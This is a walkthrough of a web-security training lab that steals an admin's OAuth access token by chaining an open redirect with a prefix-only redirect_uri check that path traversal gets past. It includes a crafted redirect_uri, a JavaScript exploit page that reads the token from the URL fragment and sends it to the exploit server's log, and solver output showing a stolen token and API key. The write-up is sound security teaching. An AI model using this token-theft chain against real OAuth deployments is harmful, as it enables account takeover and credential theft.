# Lab: Stealing OAuth access tokens via an open redirect

### Instructions

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the `admin` user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

Note:

You cannot access the admin's API key by simply logging in to their account on the client application.

The `admin` user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: `wiener:peter`. 

### Solution

Log in through Burp and watch the flow. The blog ends up calling GET `/me` with the token as a bearer credential, which is how it fetches your profile. Note that this request goes to the OAuth service host, not the blog.

Look at the blog's "Next post" feature:

```
GET /post/next?path=/post?postId=4
```

Change path to an absolute external URL and confirm it redirects there. This is an open redirect.

Now look at the GET /auth request to the OAuth service:

```
GET /auth?client_id=CLIENT_ID&redirect_uri=https://0ac60088045d54d780eb03c200af00da.web-security-academy.net/oauth-callback&response_type=token&nonce=NONCE&scope=openid%20profile%20email
```

Try changing redirect_uri to something outside the blog's domain entirely. The request gets rejected, so the OAuth service is checking it against a whitelist. Now try appending extra characters after the registered callback instead:

```
redirect_uri=https://0ac60088045d54d780eb03c200af00da.web-security-academy.net/oauth-callback/../post/next?path=https://example.com
```

This passes validation, because the check only confirms the value starts with `/oauth-callback`. A browser resolves the `../` sequence and actually requests `/post/next`, which is the open redirect you just found. Chain the two together and redirect_uri effectively becomes a path straight off the blog and onto any external site, while still passing the whitelist check.

Since this is the implicit flow, `response_type=token` means the access token comes back in the URL fragment, and browsers preserve a fragment across a redirect chain, even through an external site. So the token leaks all the way to whatever path is in path.

Set `redirect_uri` to point at your exploit server through this chain:

```
redirect_uri=https://0ac60088045d54d780eb03c200af00da.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a6000b4041454fa8013026001500061.exploit-server.net/exploit
```

Visit the full crafted auth URL yourself and confirm you land on your exploit server with access_token in the fragment.

Host this at `/exploit` on the exploit server:

```html
<script>
if (!document.location.hash) {
    document.location = "CRAFTED_AUTH_URL";
}
else {
    let params = new URLSearchParams(document.location.hash.substring(1));
    document.location = "/log?access_token=" + params.get("access_token");
}
</script>
```

The first visit has no fragment, so it kicks off the OAuth flow. When it returns with the token in the fragment, the script reads it client-side and turns it into a plain query string request against `/log`, which gets recorded server-side since a fragment itself never reaches a server.

Store the exploit, then click deliver to victim. The admin has an active OAuth session, so their browser completes the flow automatically and lands back on `/log` with their own access_token attached. Check the access log and copy it.

Use the token against the OAuth service's own userinfo endpoint, not the blog:

```
GET /me HTTP/2
Host: oauth-0ace007104f1544f800001a1028600d7.oauth-server.net
Authorization: Bearer STOLEN_TOKEN
```

The response includes the admin's `apikey` field which we can submit through the 'Submit solution' button to finish.

Root cause: the OAuth service's `redirect_uri` check only verifies a prefix match against the registered callback, not an exact match, so appending a path traversal sequence after it still passes while the browser actually resolves to a different, attacker-reachable endpoint on the same host.


### Python Solution

See `oauth_05.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/OAuth_Authentication/OAuth_05_stealing_oauth_access_tokens_via_an_open_redirect]
└─$ python oauth_05.py https://0ac60088045d54d780eb03c200af00da.web-security-academy.net/
[+] Found exploit server: https://exploit-0a6000b4041454fa8013026001500061.exploit-server.net
[+] OAuth host: https://oauth-0ace007104f1544f800001a1028600d7.oauth-server.net, client_id: jzc7sk7bh3ajj5w649qq3
[+] Stored exploit
[+] Delivered exploit to victim (admin)
[+] Stole admin's access token: H0dWe21W21HkJnw3gyE54BlsScZOgBTJRjdtLWirYqH
[+] Found apiKey via https://oauth-0ace007104f1544f800001a1028600d7.oauth-server.net/me
[+] Obtained admin's API key: RplxytiSS2YEBwPrncLD3644TIPd7OH8
[+] Submitted solution
[+] Lab solved!
```